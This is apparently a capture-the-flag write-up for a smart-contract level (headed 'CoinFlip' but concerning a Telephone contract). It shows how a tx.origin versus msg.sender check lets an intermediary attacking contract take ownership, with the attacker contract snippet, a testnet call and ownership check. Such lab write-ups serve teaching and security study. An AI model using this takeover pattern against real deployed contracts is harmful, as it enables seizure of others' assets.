# CoinFlip

## Objectives

Claim ownership of the contract to complete this level.

## Solution

The function `changeOwner()` compares whether the address that sends the tx (`tx.origin`) is the same as the address that interacts with the contract (`msg.sender`). In this case it isn't, so the owner is changed as per the function's instructions:

```cs
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

Therefore, the only thing needed here is a attacking contract which interacts with the original Telephone contract. This way the contract is the `msg.sender` while the address that interacts with the attacking contract is the `tx.origin`.

## How I did it

1. I deployed the contract `TelephoneAttack` (at: `0x756a2E146F4f9659E7c16a90948A09aB09925F19`) which interfaces with the original Telephone contract and calls its `changeOwner()` function as follows:

```cs
function callChangeOwner(address _newOwner) external {
    telephoneContract.changeOwner(_newOwner);
}
```

where `_newOwner` is the address we want to assign as new contract owner for the Telephone contract.

2. Set the instance address and call the function with my account address from which I deployed the attacking contract:

```python
telephoneattack.callChangeOwner(acc.address, _from)  
```

Block explorer: https://rinkeby.etherscan.io/tx/0x20ffc17549522276816942656e14c9fe459064afd3f99e0f851ca555cfb64711

3. Check that we're the new owner

```python
owner_assertion = telephone.owner() == acc.address
print(f'The account owner matches my address: {owner_assertion}')
```

## Submission transaction

Block explorer: https://rinkeby.etherscan.io/tx/0x7c11bb8f65a6117b8f2e17622f3bbdcc81214b8d5daafa41bbbeb54dfc60e4b5
